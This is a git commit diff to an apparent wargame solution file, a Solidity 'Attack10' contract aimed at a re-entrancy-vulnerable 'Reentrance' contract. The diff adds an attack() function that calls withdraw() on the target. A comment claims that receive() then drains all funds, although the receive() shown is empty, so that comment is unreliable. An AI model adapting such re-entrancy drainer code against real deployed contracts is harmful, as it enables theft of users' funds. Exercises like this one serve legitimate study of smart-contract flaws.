39adc067061b3779be04b1a5fcd10a108c85d783
sarobinson2001 <sarobinson2011@gmail.com>
2023-09-20 08:12:12 +0100

    update 10-attack.sol

--- contracts/10-Re-entrancy/10-attack.sol
+++ contracts/10-Re-entrancy/10-attack.sol
@@ -1,16 +1,24 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.6.12;
 
-import "./10-re-entrancy.sol";
+// import "./10-re-entrancy.sol";
+import "interfaces/ire-entrancy.sol";
 
 contract Attack10 {
-    constructor(address _reEntrancyAddress) public payable {
-        // upon deployment send funds to Reentrance receive()
-        address(_reEntrancyAddress).call{value: msg.value}("");
+    ReentrantInterface reentrance;
+    address payable public owner;
+    uint public amount;
+
+    constructor(address _reEntrancyAddress, uint _amount) public {
+        reentrance = ReentrantInterface(_reEntrancyAddress);
+        owner = msg.sender;
+        amount = _amount;
     }
 
-    receive() external payable {
-        // use ReentrantInterface to call withdraw() on Reentrance
-        // rinse repeat, until all funds drained
+    // call attack() once, then receive() drains all funds
+    function attack() public {
+        reentrance.withdraw(amount);
     }
+
+    receive() external payable {}
 }
